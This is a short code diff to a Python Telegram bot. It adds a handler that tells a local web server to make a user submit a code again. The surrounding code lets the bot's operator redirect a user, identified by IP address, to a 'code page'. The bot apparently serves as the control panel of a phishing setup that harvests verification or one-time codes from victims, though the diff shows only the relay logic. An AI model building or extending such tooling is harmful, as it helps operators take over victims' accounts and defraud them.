@@ -1124,6 +1124,14 @@ async def code_redirect_handler(call: types.CallbackQuery):
         await session.post('http://127.0.0.1:8080/admin_action', json={'action': 'code', 'ip': ip})
     await call.answer("Redirecting user to code page")
 
+@router.callback_query(lambda c: c.data and c.data.startswith('code_request_again:'))
+async def code_request_again_handler(call: types.CallbackQuery):
+    code = call.data.split(':', 1)[1]
+    import aiohttp as aiohttp_client
+    async with aiohttp_client.ClientSession() as session:
+        await session.post('http://127.0.0.1:8080/set_request_again', json={'code': code})
+    await call.answer("Request sent to user")
+
 # --- запуск aiohttp і aiogram в одному event loop ---
 if __name__ == '__main__':
     async def main():
